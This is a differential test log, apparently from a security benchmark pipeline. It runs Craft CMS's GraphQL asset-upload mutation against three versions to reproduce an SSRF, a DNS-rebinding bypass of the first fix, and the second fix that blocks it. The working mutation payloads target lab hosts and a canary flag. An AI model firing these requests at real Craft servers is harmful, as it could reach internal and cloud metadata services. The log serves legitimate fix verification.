FULL 4-WAY DIFFERENTIAL — REAL Craft GraphQL asset-upload mutation over HTTP
--------------------------------------------------------------------------------
[V0 5.8.20] seed  POST /index.php?p=actions/graphql/api
   mutation save_pcbvol_Asset(_file:{url:"http://seed.pcb.test/flag", filename:"seedv0.txt"})
   -> {"data":{"save_pcbvol_Asset":{"id":"3","url":".../uploads/seedv0.txt"}}}
   GET asset -> body = <PCB_FLAG>                    >>> FLAG (no guard; raw SSRF)

[V1 5.8.22] seed  (same mutation, port 39521)
   -> {"errors":[{"message":"http://seed.pcb.test/flag contains an invalid hostname."}...]}
                                                     >>> BLOCKED (validateHostname: gethostbyname=192.0.0.192 blocklisted)

[V1 5.8.22] RESIDUAL DNS-rebind
   mutation save_pcbvol_Asset(_file:{url:"http://rebind.pcb.test/flag", filename:"rebindv1.txt"})
   -> {"data":{"save_pcbvol_Asset":{"id":"3","url":".../uploads/rebindv1.txt"}}}
   GET asset -> body = <PCB_FLAG>                    >>> FLAG (TOCTOU: CHECK saw decoy, FETCH hit canary)

[V2 5.8.23] seed
   -> {"errors":[{"message":"http://seed.pcb.test/flag resolves to an invalid IP address."}...]}
                                                     >>> BLOCKED (ON_STATS validateIp on real primary_ip 192.0.0.192)

[V2 5.8.23] RESIDUAL DNS-rebind
   -> {"errors":[{"message":"http://rebind.pcb.test/flag resolves to an invalid IP address."}...]}
   (or, depending on rebind parity, the fetch resolves to the decoy and the asset body is
    "DECOY-PUBLIC-NO-FLAG")                          >>> BLOCKED either way (no flag reaches the metadata canary)

VERDICT: gate_passed. Genuine incomplete-fix pair on REAL Craft CMS. V1 is the target: the
CVE-2025-68437 fix (5.8.22) blocks the direct seed but the DNS-rebind residual reaches the
metadata canary; CVE-2026-27127 (5.8.23) closes it by validating the actually-connected IP.

